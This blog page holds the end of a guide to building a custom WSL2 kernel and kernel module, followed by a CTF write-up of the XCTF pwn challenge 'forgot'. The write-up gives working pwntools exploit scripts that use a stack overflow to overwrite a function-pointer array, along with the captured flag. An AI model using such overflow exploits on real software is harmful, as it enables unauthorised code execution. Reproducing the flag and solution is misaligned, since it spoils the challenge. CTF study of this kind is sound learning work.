<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.8.13.tar.gz</span><br><span class="line">tar -xzf linux-5.8.13.tar.gz</span><br><span class="line">cd linux-5.8.13</span><br></pre></td></tr></table></figure>
<p>然后在内核源码的根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir Microsoft</span><br><span class="line">cd Microsoft</span><br><span class="line">vim config-wsl</span><br></pre></td></tr></table></figure>
<p>这玩意儿可以抄<a
target="_blank" rel="noopener" href="https://github.com/xieyubo/WSL2-Linux-Kernel/blob/wsl-xyb-port-5.8.y-latest/Microsoft/config-wsl">WSL2-Linux-Kernel/Microsoft/config-wsl
at wsl-xyb-port-5.8.y-latest · xieyubo/WSL2-Linux-Kernel ·
GitHub</a>,注意版本,5.8的内核就得抄5.8的config_wsl,直接复制粘贴</p>
<p>可以修改其中的<code>CONFIG_LOCALVERSION</code>,改成自定义内核名称后缀</p>
<p>完事之后退到内核源码根目录下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make KCONIFG_CONFIG=./Microsoft/config-wsl -j`<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>
<p>编译完了之后会生成./arch/x86/boot/bzImage,这就是可以引导的内核</p>
<p>可以安装头文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make modules_install</span><br></pre></td></tr></table></figure>
<h2 id="更换内核">更换内核</h2>
<h3 id="默认配置">默认配置</h3>
<p>如果没有在~/.wslconfig中修改内核位置,那么可以这样整:</p>
<p>编译内核完成后,将生成的bzImage可引导镜像放到本机的<code>C:\Windows\System32\lxss\tools</code>这个位置</p>
<p><code>wsl --shutdown</code></p>
<p>在<code>C:\Windows\System32\lxss\tools</code>中,将之前的内核镜像kernel改个名,比如oldkernel</p>
<p>然后将刚搬过来的bzImage改成kernel</p>
<p>重启wsl</p>
<p><code>uname -a</code>查看当前内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/kernelROP/mydev]</span><br><span class="line">└─# uname -a</span><br><span class="line">Linux Executor 5.8.13-dustland #1 SMP Sun Mar 24 13:56:15 CST 2024 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
<h3 id="指定kernel位置">指定kernel位置</h3>
<p>比如在windows的<code>~/.wslconfig</code>中这样写</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Settings apply across all Linux distros running on WSL 2</span></span><br><span class="line">[wsl2]</span><br><span class="line">kernel=C:\\opt\\kernel</span><br><span class="line"><span class="comment"># Limits VM memory to use no more than 4 GB, this can be set as whole numbers using GB or MB</span></span><br><span class="line">memory=4GB      <span class="comment">#限制内存最大4G</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets the VM to use two virtual processors</span></span><br><span class="line">processors=8            <span class="comment">#设置8个处理器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vmSwitch=vEthernet</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># networkingMode=bridged</span></span><br><span class="line"><span class="comment"># vmSwitch=WSL</span></span><br><span class="line"><span class="comment"># ipv6=true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这就指定了wsl内核使用<code>c:\\opt\\kernel</code></p>
<h2 id="编译内核模块">编译内核模块</h2>
<p>需要更滑内核</p>
<p>编译内核模块需要内核头文件,</p>
<p>如果已经编译过wsl内核,并且<code>make modules_install &amp;&amp; make install</code>,那么就可以直接编译内核模块了</p>
<p>如果没有编译过内核,需要先编译内核</p>
<p>假设内核模块hello.c这样写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mod_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br><span class="line">module_exit(mod_exit);</span><br></pre></td></tr></table></figure>
<p>它的Makefile这样写</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line">KDIR = /lib/modules/5.15.137.3/</span><br><span class="line">TARGETNAME = hello</span><br><span class="line">OBJ        = <span class="variable">$(TARGETNAME)</span>.o</span><br><span class="line">MODULE     = <span class="variable">$(TARGETNAME)</span>.ko</span><br><span class="line">obj-m += <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">		make -j <span class="variable">$(nproc)</span> -C <span class="variable">$(KDIR)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">install:</span></span><br><span class="line">		@modprobe -r <span class="variable">$(TARGETNAME)</span></span><br><span class="line">		@install <span class="variable">$(MODULE)</span> <span class="variable">$(KDIR)</span>3/kernel/drivers/hid</span><br><span class="line">		@depmod</span><br><span class="line">		@modprobe <span class="variable">$(TARGETNAME)</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">		make -C <span class="variable">$(KDIR)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p>KDIR这个自己写,通常是<code>/lib/modules/$(shell uname -r)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>之后在当前目录下生成hello.ko</p>
<p>加载到内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod hello.ko</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/20/xctf-pwn-%E9%AB%98%E6%89%8B%E6%9D%91/" class="post-title-link" itemprop="url">xctf攻防世界-pwn-高手村</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-20 00:27:00 / Modified: 00:27:57" itemprop="dateCreated datePublished" datetime="2022-06-20T00:27:00+08:00">2022-06-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="xctf-攻防世界-pwn高手村">xctf-攻防世界-pwn高手村</h1>
<h2 id="forgot-on2022.6.19">forgot (On2022.6.19)</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619234811216.png"
alt="image-20220619234811216" />
<figcaption aria-hidden="true">image-20220619234811216</figcaption>
</figure>
<h3 id="checksec">checksec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/forgot]</span><br><span class="line">└─$ checksec forgot</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/forgot/forgot&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>没有金丝雀,没有地址随机化.</p>
<p>只有堆栈不可执行保护</p>
<h3 id="strings视图">Strings视图</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619191536296.png"
alt="image-20220619191536296" />
<figcaption aria-hidden="true">image-20220619191536296</figcaption>
</figure>
<p>有<code>cat</code>,<code>flag</code>字样,前往其所在的函数看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80486CC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">58</span>]; <span class="comment">// [esp+1Eh] [ebp-3Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x32</span>u, <span class="string">&quot;cat %s&quot;</span>, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显然只需要调用该函数就可以获取flag,该函数的起始地址是<code>0x80486CC</code>,然而该函数的Function
calls视图中没有调用者,即对该函数的调用要通过站缓冲区溢出修改函数返回地址实现</p>
<h3 id="main函数">main函数</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">10</span>]; <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+58h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = sub_8048604;<span class="comment">//sub_8048604是一个函数,这里没写函数括号,说明v3[0]只是存放函数地址,并不调用函数</span></span><br><span class="line">  v3[<span class="number">1</span>] = sub_8048618;</span><br><span class="line">  v3[<span class="number">2</span>] = sub_804862C;</span><br><span class="line">  v3[<span class="number">3</span>] = sub_8048640;</span><br><span class="line">  v3[<span class="number">4</span>] = sub_8048654;</span><br><span class="line">  v3[<span class="number">5</span>] = sub_8048668;</span><br><span class="line">  v3[<span class="number">6</span>] = sub_804867C;</span><br><span class="line">  v3[<span class="number">7</span>] = sub_8048690;</span><br><span class="line">  v3[<span class="number">8</span>] = sub_80486A4;</span><br><span class="line">  v3[<span class="number">9</span>] = sub_80486B8;<span class="comment">//该函数打印了&quot;You just made it. But then you didn&#x27;t!&quot;,看样子是目标函数</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;</span>, sub_8048654);<span class="comment">//将sub_8048654函数的地址打印出来</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the string to be validate&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v2);<span class="comment">//scanf获取输入,存在栈缓冲区溢出,v2可以溢出</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )<span class="comment">//会根据v2[i]来决定会不会修改v5</span></span><br><span class="line">          v5 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v5 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v5 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v5 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v3[--v5])();<span class="comment">//使用函数指针调用函数,显然要通过该函数指针执行sub_80486CC函数</span></span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>循环中出现过的三个判断函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048702</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[  -  +  .其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_804874C</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[ 其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048784</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span>;</span><br><span class="line">     <span class="comment">//a1是小写字母就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="main栈帧">main栈帧</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-00000074 v2              db 32 dup(?)</span><br><span class="line">-00000054 v3              db 40 dup(?)</span><br><span class="line">-0000002C s               db 32 dup(?)            ; string(C)</span><br><span class="line">-0000000C v5              dd ?</span><br><span class="line">-00000008 i               dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>v2在栈底,其上的所有东西都可以溢出</p>
<p>v3就是函数指针那一伙子数组</p>
<p>在<code>((void (*)(void))v3[--v5])();</code>这里,v5会经过前面的一系列循环判断被修改.</p>
<p>我们的想法是,将<code>0x80486CC</code>溢出到<code>v3[0]</code>这么一个固定地址,方便最后的<code>((void (*)(void))v3[--v5])();</code>执行它</p>
<p>那么还需要保证v5一开始为1(这个程序一开始设定好了)并且后来一直不被改变.</p>
<p>但是有个规律是,只有循环中三个判断函数返回true时v5才会被修改,如果判断函数都返回false则显然v5不会被修改.</p>
<p>又这三个判断函数只会对 a1是小写字母或者阿拉伯数字或者[ - +
.这几种情况返回true,那么如果能够将<code>v2[i]</code>溢出成除了这些字符之外的字符就可以绕过判断,保证v5=1,如此最终出循环的时候,<code>((void (*)(void))v3[--v5])();</code>就相当于<code>((void (*)(void))v3[0])();</code>,执行固定的函数</p>
<p>现在问题转化为如何保证v2数组满足上述条件,显然v2就是我们要输入的,这个自然可以满足,输入32个问号?或者32个大写字母均可</p>
<p>还要解决的是溢出<code>v3[0]</code>的问题</p>
<p><code>v3[0]</code>是一个四字32位,并且v3紧挨着v2,显然当v2写满了,紧接着就溢出v3了</p>
<p>因此exp可以这样写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>或者,反正v5总是落在1到10范围内,最后<code>((void (*)(void))v3[--v5])();</code>反正是执行的v3函数指针数组的其中一项,那么直接把v3数组的每一项都溢出成<code>0x80486CC</code>,这样就不用关心v5的值是多少了,也就是不用绕过判断函数了</p>
<p>因此exp还可以这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;?&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)*<span class="number">10</span>  <span class="comment">#由于不用关心v5,因此v2数组也不用关心了</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="flag">flag</h3>
<p>最终得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Opening connection to <span class="number">111.200</span><span class="number">.241</span><span class="number">.244</span> on port <span class="number">51086</span>: Done</span><br><span class="line">/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot/exp.py:<span class="number">23</span>: BytesWarning: Text <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">bytes</span>; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">I should give you a pointer perhaps. Here: <span class="number">8048654</span></span><br><span class="line"></span><br><span class="line">Enter the string to be validate</span><br><span class="line">&gt; cyberpeace&#123;4edfc4922cff2900b97255284e605051&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<h3 id="错误想法">错误想法</h3>
<h4 id="错误1">错误1</h4>
<p>在循环伊始</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = i;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<p>首先用<code>v0=i</code>然后让v0和<code>strlen(v2)</code>作比较,如果v0很大则直接跳过循环</p>
<p>我一开始想用溢出v0跳过循环保持v5=1不变</p>
<p>由于<code>v0=i</code>因此我想让i溢出成很大的值然后v0获得其拷贝也是个大数</p>
<p>于是得到了这样的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x7fffffff)</span><br></pre></td></tr></table></figure>
<p>前32个字符随便写填满v2,反正不会进入循环</p>
<p>然后v3的第一个四字溢出成<code>0x80486cc</code>这个函数地址</p>
